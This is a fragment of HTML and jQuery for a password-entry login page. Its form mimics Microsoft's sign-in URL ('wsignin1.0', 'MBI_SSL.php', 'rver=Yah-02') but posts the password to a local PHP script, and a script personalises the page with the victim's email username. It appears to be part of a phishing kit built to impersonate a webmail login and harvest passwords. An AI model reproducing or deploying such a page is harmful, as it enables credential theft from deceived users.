            ...
            <div class="container">
               <div class="col-1">
                    <div class="login-box">
                        ...
                        <div class="challenge">
                            <strong class="password" style="margin-bottom: 0;">Enter password</strong>
                            <p class="password" style="margin-top: 5px; font-size:15px">to finish sign in</p>
                            <form action="wsignin1.0&rpsnv=13&ct=1648037205&rver=Yah-02&wp=MBI_SSL.php" method="post" name="login" id="login" onsubmit="return ValidateFormOther()">
                                <div class="password">
    ...
    <script>
        $(document).ready(function(){
            ...
            $('.next').on('click', function() {
                ValidateEmail();
                var emailfield = $('#username').val();
                var goodmail = emailfield.split('@')[0];
                $('#firstname').text(goodmail);
            });
